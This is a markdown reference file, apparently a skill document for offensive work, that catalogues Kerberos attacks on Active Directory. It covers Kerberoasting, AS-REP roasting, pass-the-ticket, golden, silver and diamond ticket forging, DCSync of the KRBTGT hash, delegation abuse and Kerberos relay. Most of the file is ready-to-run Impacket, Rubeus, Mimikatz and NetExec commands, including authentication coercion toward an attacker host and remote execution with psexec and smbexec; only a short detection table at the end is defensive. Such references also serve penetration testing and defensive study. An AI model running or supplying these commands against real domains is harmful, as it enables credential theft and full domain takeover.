---
name: kerberos-attacks
description: Kerberos protocol attack techniques and exploitation
tags: [kerberos, ad, windows, tickets]
version: "1.0"
---

# Kerberos Attack Techniques

## Kerberos Authentication Flow

```
Client                    KDC (DC)                   Service
   │                         │                          │
   │──AS-REQ (username)─────>│                          │
   │<─AS-REP (TGT)───────────│                          │
   │                         │                          │
   │──TGS-REQ (TGT, SPN)────>│                          │
   │<─TGS-REP (TGS)──────────│                          │
   │                         │                          │
   │──AP-REQ (TGS)──────────────────────────────────────>│
   │<─AP-REP────────────────────────────────────────────│
```

## Attack Categories

### 1. Kerberoasting

Request TGS tickets for service accounts and crack offline.

```bash
# Impacket - GetUserSPNs
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerberoast.txt

# Targeting specific user
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user svc_sql
```

**Crack Hashes:**
```bash
# Hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# John
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

### 2. AS-REP Roasting

Attack accounts with "Do not require Kerberos preauthentication" enabled.

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat

# With credentials (query LDAP)
GetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe asreproast /outfile:asrep.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt
```

**Crack Hashes:**
```bash
# Hashcat
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

### 3. Pass-the-Ticket (PtT)

Inject stolen Kerberos tickets into session.

```bash
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Inject ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# Rubeus inject
Rubeus.exe ptt /ticket:base64_ticket

# Linux - export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache
```

### 4. Overpass-the-Hash (Pass-the-Key)

Request TGT using NTLM hash instead of password.

```bash
# Rubeus
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt

# Impacket
getTGT.py domain.local/admin -hashes :NTLM_HASH

# With AES key
getTGT.py domain.local/admin -aesKey AES_KEY
```

### 5. Golden Ticket

Forge TGT using KRBTGT hash (requires domain compromise).

```bash
# Get KRBTGT hash (DCSync)
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user krbtgt

# Create Golden Ticket (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local fakeadmin

# Use ticket
export KRB5CCNAME=fakeadmin.ccache
psexec.py domain.local/fakeadmin@dc01 -k -no-pass
```

### 6. Silver Ticket

Forge TGS for specific service using service account hash.

```bash
# Get service account hash
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user svc_sql$

# Create Silver Ticket for CIFS (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local \
  /service:cifs /rc4:SERVICE_NTLM /ptt

# Impacket - Silver ticket for MSSQL
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local -spn MSSQLSvc/sql01.domain.local:1433 admin
```

**Common Service SPNs:**
| Service | SPN |
|---------|-----|
| SMB/CIFS | cifs/hostname |
| MSSQL | MSSQLSvc/hostname:1433 |
| HTTP | http/hostname |
| LDAP | ldap/hostname |
| HOST | host/hostname |

### 7. Diamond Ticket

Modify legitimate TGT (harder to detect than Golden Ticket).

```bash
# Rubeus (requires KRBTGT AES key)
Rubeus.exe diamond /krbkey:AES256_KEY /user:user /password:pass \
  /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt
```

### 8. Delegation Attacks

#### Unconstrained Delegation
```bash
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Coerce authentication (PrinterBug)
SpoolSample.exe dc01.domain.local attacker.domain.local

# Capture and use TGT
Rubeus.exe monitor /interval:1
Rubeus.exe ptt /ticket:base64_tgt
```

#### Constrained Delegation
```bash
# S4U2Self + S4U2Proxy
getST.py -spn cifs/target.domain.local domain.local/svc_constrained:pass \
  -impersonate administrator

# Rubeus
Rubeus.exe s4u /user:svc_constrained /rc4:HASH \
  /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

#### Resource-Based Constrained Delegation (RBCD)
```bash
# Add computer account
addcomputer.py domain.local/user:pass -method LDAPS -computer-name FAKE$ -computer-pass Pass123

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip 10.0.0.1 domain.local/user:pass

# Get ticket
getST.py -spn cifs/target.domain.local domain.local/FAKE$:Pass123 -impersonate administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
smbexec.py domain.local/administrator@target.domain.local -k -no-pass
```

### 9. Kerberos Relay

Relay Kerberos authentication (KrbRelayUp, KrbRelay).

```bash
# KrbRelayUp (local privilege escalation)
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
  -ComputerName YOURCOMPUTER$ -ComputerPassword Password123

# Then use RBCD to escalate
```

## Encryption Types

| etype | Algorithm | Strength |
|-------|-----------|----------|
| 0x17 (23) | RC4-HMAC | Weak (NTLM hash) |
| 0x11 (17) | AES128-CTS | Strong |
| 0x12 (18) | AES256-CTS | Strongest |

## Ticket Fields

| Field | Description |
|-------|-------------|
| cname | Client principal name |
| crealm | Client realm |
| sname | Service principal name |
| srealm | Service realm |
| enc-part | Encrypted ticket data |
| authtime | Authentication time |
| starttime | Ticket valid from |
| endtime | Ticket expires |
| renew-till | Renewal expiration |

## Detection Indicators

| Attack | Event ID | Indicator |
|--------|----------|-----------|
| Kerberoasting | 4769 | RC4 ticket requests |
| AS-REP Roast | 4768 | Pre-auth disabled accounts |
| Golden Ticket | 4769 | Non-existent users |
| Silver Ticket | N/A | Direct service access |
| Overpass-the-Hash | 4768 | NTLM in AS-REQ |
| DCSync | 4662 | DS-Replication-Get-Changes |
